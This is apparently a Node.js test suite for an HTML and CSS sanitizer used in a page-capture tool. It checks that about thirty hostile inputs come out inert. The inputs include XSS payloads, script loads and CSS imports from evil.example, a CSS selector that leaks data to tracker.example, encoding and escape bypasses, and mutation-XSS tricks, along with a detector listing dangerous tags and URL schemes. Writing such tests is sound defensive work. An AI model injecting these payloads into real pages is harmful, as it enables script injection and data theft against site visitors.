'use strict';

// [UNIT] v1.395.0 Pages, Step 3 (plan D-PARSE 4, D-RENDER, Testing strategy): the
// hostile-input suite. Every case runs through BOTH profiles (reader, original)
// and BOTH modes (capture, final), and the verdict is read from what a REAL HTML5
// parser (jsdom's parse5, the browser's algorithm) builds from our output - so a
// serializer quirk that re-parses into something live (mutation XSS) fails too.

const test = require('node:test');
const assert = require('node:assert');
const { JSDOM, VirtualConsole } = require('jsdom');
const { sanitize, readerFragment, originalDocument, parseSrcset, bestFromSrcset } = require('../../lib/pages/sanitize');
const { sanitizeCss, placeholderUrls, resolvePlaceholders } = require('../../lib/pages/css');

const BASE = 'https://news.example.com/2026/story.html';
const URL_ATTRS = ['href', 'src', 'action', 'formaction', 'srcdoc', 'xlink:href', 'data', 'poster', 'background', 'cite', 'longdesc', 'ping', 'lowsrc', 'dynsrc', 'codebase', 'manifest', 'icon', 'srcset'];

function render(html, profile, final) {
  const clean = sanitize(html, { profile, base: BASE, final }).tree;
  return profile === 'original' ? originalDocument(clean) : readerFragment(clean);
}

// Everything a browser could execute, navigate to or load from what we emit.
function liveProblems(out) {
  const dom = new JSDOM(out, { virtualConsole: new VirtualConsole() });
  const doc = dom.window.document;
  const problems = [];
  for (const el of doc.querySelectorAll('*')) {
    const name = el.localName.toLowerCase();
    if (['script', 'iframe', 'frame', 'object', 'embed', 'applet', 'base', 'form', 'input', 'button', 'textarea', 'select', 'link', 'portal', 'foreignobject', 'animate', 'set', 'animatetransform', 'animatemotion', 'handler', 'template', 'video', 'audio', 'source', 'image'].includes(name)) problems.push(`<${name}>`);
    if (name === 'meta' && !(el.attributes.length === 1 && el.getAttribute('charset') === 'utf-8')) problems.push('<meta> other than our charset');
    for (const a of el.attributes) {
      const an = a.name.toLowerCase();
      const v = a.value;
      if (an.startsWith('on')) problems.push(`${name}[${an}]`);
      if (URL_ATTRS.includes(an)) {
        const t = v.replace(/[\u0000-\u0020]/g, '').toLowerCase(); // eslint-disable-line no-control-regex
        if (/^(javascript|vbscript|livescript|file|blob|filesystem):/.test(t)) problems.push(`${name}[${an}]=${v.slice(0, 40)}`);
        if (/^data:/.test(t) && !(an === 'src' && /^data:image\/(png|gif|jpeg|jpg|webp|avif);base64,/.test(t))) problems.push(`${name}[${an}] data URL`);
        if (an === 'src' && /^https?:/.test(t)) problems.push(`${name}[src] loads a remote ${v.slice(0, 40)}`);
        if (an === 'srcdoc' || an === 'formaction' || an === 'action') problems.push(`${name}[${an}]`);
      }
      if (an === 'style') problems.push(...cssProblems(v, `${name}[style]`));
      // SVG references: <use> only to a local #id; a url() in any other attribute (fill, clip-path) only to a local #id.
      if (name === 'use' && (an === 'href' || an === 'xlink:href') && !v.trim().startsWith('#')) problems.push(`use[${an}] external ${v.slice(0, 40)}`);
      if (an !== 'style' && /url\(/i.test(v) && !/^\s*url\(\s*['"]?#[A-Za-z0-9_-]+['"]?\s*\)\s*$/.test(v)) problems.push(`${name}[${an}] url() ${v.slice(0, 40)}`);
    }
    if (name === 'style') problems.push(...cssProblems(el.textContent, '<style>'));
    if (name === 'a' && el.hasAttribute('href') && (el.getAttribute('target') !== '_blank' || el.getAttribute('rel') !== 'noopener noreferrer')) problems.push('a link without target=_blank rel=noopener noreferrer');
  }
  dom.window.close();
  return problems;
}

function cssProblems(text, where) {
  const t = String(text).toLowerCase().replace(/\\/g, '');
  const out = [];
  if (/@import/.test(t)) out.push(`${where} @import`);
  if (/expression\s*\(/.test(t)) out.push(`${where} expression()`);
  if (/javascript:|vbscript:/.test(t)) out.push(`${where} script URL`);
  if (/-moz-binding|behavior\s*:/.test(t)) out.push(`${where} binding`);
  for (const m of t.matchAll(/url\(\s*(['"]?)([^'")]*)\1\s*\)/g)) {
    const u = m[2];
    if (!(u.startsWith('ft-src:') || /^assets\/[0-9a-f]{24}\.[a-z0-9]+$/.test(u) || u.startsWith('#') || /^data:image\/(png|gif|jpeg|jpg|webp|avif);base64,/.test(u))) out.push(`${where} url(${u.slice(0, 40)})`);
  }
  if (/image-set\(|cross-fade\(|element\(/.test(t)) out.push(`${where} loader function`);
  if (/<\/style/.test(String(text).toLowerCase())) out.push(`${where} closes its element`);
  return out;
}

const HOSTILE = {
  'script tag': '<p>a</p><script>alert(1)</script><SCRIPT SRC=//evil.example/x.js></SCRIPT>',
  'script in a weird case and with attributes': '<ScRiPt type="text/javascript">alert(1)</sCrIpT>',
  'event handlers': '<p onclick="alert(1)" ONMOUSEOVER=alert(2)>x</p><img src=x.png onerror=alert(3)><body onload=alert(4)>',
  'javascript: href': '<a href="javascript:alert(1)">a</a><a href="JaVaScRiPt:alert(1)">b</a><a href=" javascript:alert(1)">c</a>',
  'entity-encoded javascript:': '<a href="&#106;avascript:alert(1)">a</a><a href="&#x6A;&#x61;vascript&colon;alert(1)">b</a><a href="java&#9;script:alert(1)">c</a><a href="java&#10;script:alert(1)">d</a>',
  'vbscript and data hrefs': '<a href="vbscript:msgbox(1)">v</a><a href="data:text/html,<script>alert(1)</script>">d</a>',
  'iframe srcdoc': '<iframe srcdoc="<script>alert(1)</script>"></iframe><iframe src="javascript:alert(1)"></iframe>',
  'object / embed / applet': '<object data="evil.swf"></object><embed src="evil.swf"><applet code="x"></applet>',
  'svg with script and handlers': '<svg onload="alert(1)"><script>alert(2)</script><a xlink:href="javascript:alert(3)"><rect width="10" height="10"/></a><animate attributeName="href" to="javascript:alert(4)"/><foreignObject><iframe src="x"></iframe></foreignObject><use href="https://evil.example/s.svg#x"/></svg>',
  'svg image and set': '<svg><image href="https://evil.example/x.png"/><set attributeName="onmouseover" to="alert(1)"/></svg>',
  'svg external references': '<svg><defs><linearGradient id="g"><stop offset="0"/></linearGradient></defs><use xlink:href="https://evil.example/sprite.svg#icon"/><use href="//evil.example/s.svg#i"/><rect fill="url(https://evil.example/p.svg#x)" clip-path="url(//evil.example/c#c)" width="1" height="1"/><rect fill="url(#g)" width="1" height="1"/></svg>',
  'math with an href': '<math><mtext><a href="javascript:alert(1)">m</a></mtext></math>',
  'base and meta refresh': '<head><base href="https://evil.example/"><meta http-equiv="refresh" content="0;url=javascript:alert(1)"><meta http-equiv="Set-Cookie" content="a=b"></head><p>t</p>',
  'forms and formaction': '<form action="javascript:alert(1)"><input name=q><button formaction="javascript:alert(2)">go</button><textarea>t</textarea><select><option>o</option></select></form>',
  'css url(javascript:)': '<div style="background:url(javascript:alert(1))">a</div><div style="background:URL(&quot;javascript:alert(1)&quot;)">b</div>',
  'css @import': '<style>@import url(https://evil.example/x.css); @IMPORT "https://evil.example/y.css"; p{color:red}</style>',
  'css expression and escapes': '<div style="width:expression(alert(1))">a</div><div style="w\\idth: e\\78 pression(alert(1))">b</div><div style="x:ex/**/pression(alert(1))">c</div><style>p{background:u\\72 l(javascript:alert(1))}</style>',
  'css binding / behavior': '<div style="-moz-binding:url(https://evil.example/x.xml#x)">a</div><div style="behavior:url(x.htc)">b</div>',
  'css remote url (exfiltration)': '<div style="background-image:url(https://tracker.example/p.gif)">a</div><style>a[href^=x]{background:url(//tracker.example/leak)}</style>',
  'css image-set by string': '<style>p{background-image:image-set("https://evil.example/a.png" 1x)}</style>',
  'style that closes itself': '<style>p{content:"</style><script>alert(1)</script>"}</style>',
  'noscript and template tricks': '<noscript><p title="</noscript><img src=x onerror=alert(1)>"></p></noscript><template><script>alert(1)</script></template>',
  'textarea / title breakout': '<title></title><script>alert(1)</script></title><textarea></textarea><img src=x onerror=alert(1)></textarea>',
  'comment breakout': '<!--><img src=x onerror=alert(1)>--><p>a</p>',
  'attribute breakout': '<p title="a&quot; onmouseover=&quot;alert(1)">x</p><img alt="\'><script>alert(1)</script>" src="a.png">',
  'srcset javascript': '<img srcset="javascript:alert(1) 1x, https://ok.example/a.png 2x">',
  'link stylesheet with a script url': '<link rel=stylesheet href="javascript:alert(1)"><link rel="import" href="https://evil.example/x.html">',
  'video / audio sources': '<video src="https://evil.example/v.mp4" poster="javascript:alert(1)"><source src="x"></video><audio src="a.mp3"></audio>',
  'xmp / plaintext / listing': '<xmp><script>alert(1)</script></xmp><listing><img src=x onerror=alert(1)></listing>',
  'namespaced and unknown elements': '<o:p onclick=alert(1)>a</o:p><x-foo onmouseover=alert(1)>b</x-foo><svg:script>alert(1)</svg:script>',
  'a data: image is kept, a data: svg is not': '<img src="data:image/svg+xml;base64,PHN2Zz48c2NyaXB0PmFsZXJ0KDEpPC9zY3JpcHQ+PC9zdmc+"><img src="data:image/png;base64,iVBORw0KGgo=">',
  'mutation: nested quotes in svg style': '<svg><style><img src=x onerror=alert(1)></style></svg>',
  'mutation: select + style': '<select><style></select><img src=x onerror=alert(1)></style></select>',
};

for (const [label, html] of Object.entries(HOSTILE)) {
  for (const profile of ['reader', 'original']) {
    for (const final of [false, true]) {
      test(`hostile: ${label} [${profile}, ${final ? 'final' : 'capture'}] leaves nothing live`, () => {
        const out = render(html, profile, final);
        assert.deepStrictEqual(liveProblems(out), [], out);
      });
    }
  }
}

test('the allowlist keeps what a reader needs: text structure, links (absolute, new tab), tables, code, figures', () => {
  const out = render('<h2>H</h2><p>A <a href="/rel">link</a>, <em>em</em>, <code>c</code>.</p><table><tr><th scope=col>h</th><td colspan=2>d</td></tr></table><pre><code>x &lt; y</code></pre><figure><img src="/i.png" alt="pic" width=600><figcaption>cap</figcaption></figure><ol start=3><li>x</li></ol>', 'reader', false);
  assert.match(out, /<h2>H<\/h2>/);
  assert.match(out, /<a href="https:\/\/news\.example\.com\/rel" target="_blank" rel="noopener noreferrer">link<\/a>/);
  assert.match(out, /<th scope="col">h<\/th><td colspan="2">d<\/td>/);
  assert.match(out, /<pre><code>x &lt; y<\/code><\/pre>/);
  assert.match(out, /<img data-ft-src="https:\/\/news\.example\.com\/i\.png" alt="pic" width="600" loading="lazy"\/>/, 'capture: the image is pending, nothing loads');
  assert.match(out, /<ol start="3">/);
});

test('reader drops class, id and style; original keeps them sanitized', () => {
  const html = '<div class="c" id="i" style="color:red;background:url(/b.png)">x</div>';
  assert.strictEqual(render(html, 'reader', false), '<div>x</div>\n');
  const o = render(html, 'original', false);
  assert.match(o, /<div class="c" id="i" style="color:red;background:url\(&quot;ft-src:https%3A%2F%2Fnews\.example\.com%2Fb\.png&quot;\)">x<\/div>/);
});

test('final mode keeps only the item\'s own assets: a pending image with no stored file is removed', () => {
  const stored = '<p><img src="assets/0123456789abcdef01234567.png" alt="a"><img data-ft-src="https://x.example/a.png"><img src="https://x.example/b.png"><img src="assets/../../etc/passwd"></p>';
  const out = render(stored, 'reader', true);
  assert.strictEqual(out, '<p><img src="assets/0123456789abcdef01234567.png" alt="a" loading="lazy"/></p>\n');
});

test('lazy images: data-src / data-srcset / <picture> sources become the pending image (srcset split per the spec: commas inside URLs)', () => {
  assert.deepStrictEqual(parseSrcset('https://c.example/w_100,h_50/a.jpg 100w, https://c.example/w_800,h_400/a.jpg 800w'), [
    { url: 'https://c.example/w_100,h_50/a.jpg', w: 100, x: 1 },
    { url: 'https://c.example/w_800,h_400/a.jpg', w: 800, x: 1 },
  ]);
  assert.strictEqual(bestFromSrcset('a.jpg 1x, b.jpg 2x, c.jpg 3x'), 'b.jpg');
  assert.strictEqual(bestFromSrcset('s.jpg 300w, m.jpg 1200w, l.jpg 2400w'), 'm.jpg');
  const lazy = render('<img src="data:image/gif;base64,R0lGODlhAQABAAAAACw=" data-src="/real.jpg">', 'reader', false);
  assert.match(lazy, /data-ft-src="https:\/\/news\.example\.com\/real\.jpg"/);
  const pic = render('<picture><source type="image/webp" srcset="/a.webp 1x"><img src="/a.jpg" alt="p"></picture>', 'reader', false);
  assert.match(pic, /^<img data-ft-src="https:\/\/news\.example\.com\/a\.webp" alt="p" loading="lazy"\/>/);
});

test('original: a stylesheet link becomes a pending <style>; inline CSS keeps its rules with url()s as placeholders', () => {
  const o = render('<head><link rel="stylesheet" href="/s.css" media="screen"><style>.a{background:url(i.png)} .b > .c{color:blue}</style></head><body><p class="a">x</p></body>', 'original', false);
  assert.match(o, /<style data-ft-href="https:\/\/news\.example\.com\/s\.css" media="screen"><\/style>/);
  assert.match(o, /<style>\.a\{background:url\("ft-src:https%3A%2F%2Fnews\.example\.com%2F2026%2Fi\.png"\)\} \.b > \.c\{color:blue\}<\/style>/, 'CSS is raw (a > combinator survives) and relative url() resolves against the page');
  assert.match(o, /^<!DOCTYPE html>\n<html><head><meta charset="utf-8"\/>/);
});

test('the CSS tokenizer decodes escapes and comments before it checks (the bypass spellings)', () => {
  for (const evil of ['x:e\\78 pression(alert(1))', 'x:\\65 xpression(1)', 'x:ex/**/pression(1)', 'background:u\\rl(javascript:alert(1))', 'background:url(java\\script:alert(1))', 'background:url("java\\73 cript:alert(1)")', '-moz-bind\\ing:url(x)', 'be\\68 avior:url(x)']) {
    const { css } = sanitizeCss(evil, { base: BASE, declarationsOnly: true });
    assert.deepStrictEqual(cssProblems(css, evil), [], `${evil} -> ${css}`);
    assert.ok(!/alert|binding|behavior|xpression/i.test(css.replace(/\\/g, '')), `${evil} -> ${css}`);
  }
  // Tailwind-style escaped selectors keep working.
  const tw = sanitizeCss('.md\\:flex{display:flex}', { base: BASE }).css;
  assert.strictEqual(tw, '.md\\:flex{display:flex}');
});

test('CSS placeholders round-trip: capture names the absolute URL, the localizer swaps it or writes none', () => {
  const { css, refs } = sanitizeCss('a{background:url(/x.png)} b{background:url("https://cdn.example/y.png")} c{background:url(data:image/png;base64,iVBORw0KGgo=)}', { base: BASE });
  assert.deepStrictEqual(refs, ['https://news.example.com/x.png', 'https://cdn.example/y.png']);
  assert.deepStrictEqual(placeholderUrls(css), refs);
  const map = new Map([['https://news.example.com/x.png', 'assets/0123456789abcdef01234567.png']]);
  assert.strictEqual(resolvePlaceholders(css, map), 'a{background:url("assets/0123456789abcdef01234567.png")} b{background:none} c{background:url("data:image/png;base64,iVBORw0KGgo=")}');
  const fin = sanitizeCss(resolvePlaceholders(css, map), { mode: 'final' }).css;
  assert.strictEqual(fin, 'a{background:url("assets/0123456789abcdef01234567.png")} b{background:none} c{background:url("data:image/png;base64,iVBORw0KGgo=")}');
  assert.strictEqual(sanitizeCss('a{background:url("ft-src:https%3A%2F%2Fevil.example%2Fz")}', { mode: 'final' }).css, 'a{background:none}', 'final: a leftover placeholder is removed');
  assert.strictEqual(sanitizeCss('a{background:url("assets/0123456789abcdef01234567.png")}', { base: BASE }).css, 'a{background:url("ft-src:https%3A%2F%2Fnews.example.com%2F2026%2Fassets%2F0123456789abcdef01234567.png")}', 'capture: a page cannot name our assets');
});

// Inert even raw: these bind our serializer's quoting, not a removal.
const INERT_RAW = { 'attribute breakout': 'a quote inside a quoted value is data in the browser too; the case proves our serializer re-escapes it' };

test('non-vacuity: the detector flags every hostile input BEFORE sanitizing (so a pass above means the sanitizer removed it)', () => {
  const vacuous = [];
  for (const [label, html] of Object.entries(HOSTILE)) {
    if (INERT_RAW[label]) continue;
    const raw = liveProblems('<!DOCTYPE html><html><head></head><body>' + html + '</body></html>');
    if (raw.length === 0) vacuous.push(label);
  }
  assert.deepStrictEqual(vacuous, [], 'these hostile inputs are not live even raw - the case proves nothing');
});

test('DROP removes the CONTENT too (a dropped element is never unwrapped into text), in both profiles', () => {
  const { DROP } = require('../../lib/pages/sanitize');
  const { VOID } = require('../../lib/pages/tidy');
  const leaked = [];
  for (const name of DROP) {
    if (VOID.has(name)) continue; // a void element has no content to drop (its "content" is a sibling)
    for (const profile of ['reader', 'original']) {
      const out = render('<p>keep</p><' + name + '>SECRET-' + name + '</' + name + '>', profile, false);
      if (out.includes('SECRET-')) leaked.push(profile + ':' + name);
      if (!out.includes('keep')) leaked.push(profile + ':lost the sibling');
    }
  }
  assert.deepStrictEqual(leaked, []);
  for (const must of ['script', 'iframe', 'object', 'embed', 'base', 'meta', 'link', 'input', 'button', 'textarea', 'select', 'template', 'math', 'foreignobject', 'animate', 'set']) assert.ok(DROP.has(must), must);
});

test('an element outside the allowlist is unwrapped (its text kept), never kept as an element', () => {
  const out = render('<custom-card data-x="1"><marquee>scroll</marquee><font color=red>old</font></custom-card>', 'reader', false);
  assert.strictEqual(out, 'scrollold\n');
});

test('a script URL in a plain attribute (title, alt, class) is dropped, not kept as text', () => {
  const out = render('<p title="javascript:alert(1)" class="vbscript:x">t</p><img alt="data:text/html,x" src="/i.png">', 'original', false);
  assert.ok(!/javascript:|vbscript:|data:text/i.test(out), out);
});

test('the Reader drops the CONTENT of style, noscript, head, title, svg, form and nav (no CSS or script text shows up as words)', () => {
  for (const name of ['style', 'noscript', 'title', 'svg', 'form', 'nav']) {
    const out = render('<p>keep</p><' + name + '>SECRET-' + name + '</' + name + '>', 'reader', false);
    assert.ok(!out.includes('SECRET-'), name + ': ' + out);
    assert.ok(out.includes('keep'));
  }
  const head = render('<html><head><title>T</title><style>p{color:red}</style></head><body><p>keep</p></body></html>', 'reader', false);
  assert.strictEqual(head, '<p>keep</p>\n');
});

test('CSS text can never close its <style> element, and comments do not survive into the output', () => {
  const { css } = sanitizeCss('a{content:"</style><script>alert(1)</script>"} /* </STYLE> secret */ b{color:red}', { base: BASE });
  assert.ok(!/<\/style/i.test(css), css);
  assert.ok(!/secret/.test(css), 'a comment is dropped: ' + css);
  assert.match(css, /b\{color:red\}/);
});

test('gate r1 C1: the FINAL pass keeps links (absolute markup, no base) - a final pass once stripped every link', () => {
  const html = '<p>See <a href="https://other.example/report" target="_blank" rel="noopener noreferrer">the report</a> and <a href="mailto:a@b.example">mail</a>.</p>';
  for (const base of [null, undefined, BASE]) {
    const out = readerFragment(sanitize(html, { profile: 'reader', base, final: true }).tree);
    assert.match(out, /<a href="https:\/\/other\.example\/report" target="_blank" rel="noopener noreferrer">the report<\/a>/, String(base));
    assert.match(out, /href="mailto:a@b\.example"/);
  }
});

test('gate r1 A3: dropping @import is linear (80000 of them sanitize in well under a second)', () => {
  const t0 = Date.now();
  const { css } = sanitizeCss('@import '.repeat(80000) + 'p{color:red}', { base: BASE });
  const ms = Date.now() - t0;
  assert.ok(ms < 1000, `${ms} ms`);
  assert.ok(!/@import/i.test(css));
});
